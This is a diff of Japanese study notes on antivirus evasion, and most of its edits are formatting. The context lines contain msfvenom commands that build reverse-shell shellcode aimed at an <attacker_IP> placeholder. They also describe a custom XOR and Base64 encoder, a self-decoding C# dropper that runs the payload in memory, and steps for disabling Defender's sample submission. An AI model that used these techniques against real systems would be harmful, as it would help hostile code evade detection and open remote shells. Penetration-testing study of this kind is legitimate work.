@@ -1,6 +1,6 @@
 - 関連ノート：
     - [AV Evasion：概念と理論](AV%20Evasion：概念と理論.md)
-    - 
+    - [PE構造とシェルコード](PE構造とシェルコード.md)
 
 > [!TIP]
 > EXEよりもDLLのほうがAV回避の成功確率が高い。
@@ -20,7 +20,7 @@
 - 🔗[Kleenscan.com](https://kleenscan.com/)：VirusTotalの代替
 - 約30種類のAVでスキャンし、第三者にはサンプルを共有しないと主張
 - 無料で1日最大4回（追加は有料）
-- ただしあくまで**最終手段**。ターゲットのAV情報が不明な場合に限定して使う
+- ただしあくまで**最終手段**で、ターゲットのAV情報が不明な場合に限定して使う
 
 ## 理想的なAV回避テスト環境
 
@@ -28,11 +28,12 @@
 - どのAVを使う場合でも「サンプル自動送信」の設定は必ず無効にする
     - Windows Defenderの場合：「Windowsセキュリティ」→「ウイルスと脅威の防止」→「設定の管理」から無効化
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020250702073235.png)
+![](../../画像ファイル/Pasted%20image%2020250702073235.png)
 
 $$Windows Defenderのサンプル自動提供の無効化$$
 
-> [!NOTE] Windows Defenderのクラウド保護やサンプル自動送信はインターネット接続が前提。一部の本番サーバでは外部接続が制限されており、ML検知など高度なAV機能が使われていない場合もある。
+> [!NOTE]
+> Windows Defenderのクラウド保護やサンプル自動送信はインターネット接続が前提。一部の本番サーバでは外部接続が制限されており、ML検知など高度なAV機能が使われていない場合もある。
 
 ---
 
@@ -40,7 +41,7 @@ $$Windows Defenderのサンプル自動提供の無効化$$
 
 - 既知のツールや公開されたコードは避ける
 - **独自コードを優先**する（AVのシグネチャは過去のサンプルから生成されているため、新規で多様なコードほど検出されにくい）
-- すべてのAVをバイパスしようとするのは現実的でない。ターゲットで使われている**特定のAV製品**をバイパスする方法を考える
+- すべてのAVをバイパスしようとするのは現実的でないため、ターゲットで使われている**特定のAV製品**をバイパスする方法を考える
 
 ---
 
@@ -57,20 +58,19 @@ msfvenom -a x86 --platform Windows LHOST=<attacker_IP> LPORT=443 \
   -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
 ```
 
-> [!WARNING] AVベンダーはMetasploitの動作を把握しており、ツール由来のペイロードは検出されやすい。
+> [!WARNING]
+> AVベンダーはMetasploitの動作を把握しており、ツール由来のペイロードは検出されやすい。
 
 ## カスタムXOR + Base64エンコード（推奨）
 
 AVが解析できないカスタムエンコーディングを使う。高度な複雑さは不要で、XOR + Base64の組み合わせで十分に回避可能。
 
-**1. シェルコード生成**
-
+1. シェルコード生成
 ```zsh
 msfvenom LHOST=<attacker_IP> LPORT=<port> -p windows/x64/shell_reverse_tcp -f csharp
 ```
 
-**2. Encoder（C#）**
-
+2. Encoder（C#）
 ```csharp
 using System;
 using System.Text;
@@ -98,10 +98,7 @@ csc.exe Encrypter.cs
 .\Encrypter.exe   # → Base64エンコード済みシェルコードが出力される
 ```
 
-**3. Self-decoding Dropper（C#）**
-
-Base64デコード → XOR復号 → メモリ上で実行する。
-
+3. Self-decoding Dropper（C#）を用意し、Base64デコード → XOR復号 → メモリ上で実行させる
 ```csharp
 using System;
 using System.Text;
@@ -166,7 +163,7 @@ csc.exe EncStageless.cs
 3. Entry Pointがアンパッカー（Stub）を指すように書き換えられる
 4. 実行時にアンパッカーが元のコードをメモリ上に展開し、実行フローを移す
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230621093934.png)
+![](../../画像ファイル/Pasted%20image%2020230621093934.png)
 
 $$Packerによる構造変化$$
 
